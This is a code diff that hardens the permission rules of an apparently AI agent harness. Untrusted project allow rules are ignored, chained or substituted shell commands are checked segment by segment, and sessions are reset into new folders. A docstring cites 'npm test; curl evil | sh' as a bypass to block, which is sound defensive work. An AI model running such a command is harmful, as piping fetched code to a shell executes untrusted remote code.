@@ -671,22 +671,46 @@ def _rules(root) -> dict:
     pattern with * wildcards ("bash:npm test*"). Deny wins over allow; the project's rules add to the user's."""
     out = {"allow": [x.strip() for x in os.environ.get("MH_ALLOW", "").split(",") if x.strip()],
            "deny": [x.strip() for x in os.environ.get("MH_DENY", "").split(",") if x.strip()]}
+    from meshpool_harness.agent import extras as EX
+    trusted = EX.project_trusted(root)
     for f in (C.home() / "permissions.json", Path(root) / ".meshpool" / "permissions.json"):
         try:
             d = json.loads(f.read_text(encoding="utf-8"))
         except (OSError, ValueError):
             continue
+        if not isinstance(d, dict):
+            continue
         for k in out:
+            if k == "allow" and f.parent != C.home() and not trusted:
+                continue                       # an untrusted project's own "allow" rules pre-approve nothing
             out[k] += [str(x) for x in (d.get(k) or []) if isinstance(x, str)]
     return out
 
 
+_CHAIN = re.compile(r"&&|\|\||[;|\n]|(?<![>&\d])&(?![&>])")
+
+
+def _bash_segments_match(cmd: str, pattern: str) -> bool:
+    """A "bash:" rule matches only when every part of a chained command (; && || | & or a new line) matches the
+    pattern, and never a command with a substitution: "bash:npm test*" must not allow "npm test; curl evil | sh"."""
+    import fnmatch
+    cmd = cmd.strip()
+    if "$(" in cmd or "`" in cmd:
+        return False
+    parts = [x.strip() for x in _CHAIN.split(cmd) if x.strip()]
+    if len(parts) <= 1:
+        return fnmatch.fnmatchcase(cmd, pattern)
+    if _CHAIN.search(pattern) and fnmatch.fnmatchcase(cmd, pattern):
+        return True                                # the rule itself names that exact chain
+    return all(fnmatch.fnmatchcase(x, pattern) for x in parts)
+
+
 def _rule_hit(rules: list, name: str, args: dict) -> str:
     import fnmatch
-    cmd = " ".join(str(x) for x in (args.get("command") or args.get("cmd") or "", *(args.get("commands") or []))).strip()
+    cmds = [str(x) for x in (args.get("command") or args.get("cmd") or "", *(args.get("commands") or [])) if x]
     for r in rules:
         if r.startswith("bash:"):
-            if cmd and fnmatch.fnmatchcase(cmd, r[5:].strip()):
+            if cmds and all(_bash_segments_match(c, r[5:].strip()) for c in cmds):
                 return r
         elif fnmatch.fnmatchcase(name, r) or fnmatch.fnmatchcase(name.replace("-", "_"), r):
             return r
@@ -960,6 +984,13 @@ class Agent:
         return bool(items)
 
     def reset(self):
+        # a new conversation gets its own session folder: the next save() must not overwrite the one just left
+        self.id = time.strftime("%Y%m%d-%H%M%S-") + uuid.uuid4().hex[:4]
+        self.dir = self.dir.parent / self.id
+        self.created = time.time()
+        self.usage = {"in": 0, "cached": 0, "out": 0, "calls": 0}
+        self._todos = []
+        self.unfinished = False
         self.messages = [{"role": "system", "content": self.system_prompt()}]
         self.ws = Workspace(str(self.root), str(self.dir / "tool-output"))
         self.ws.should_stop = lambda: self._stop
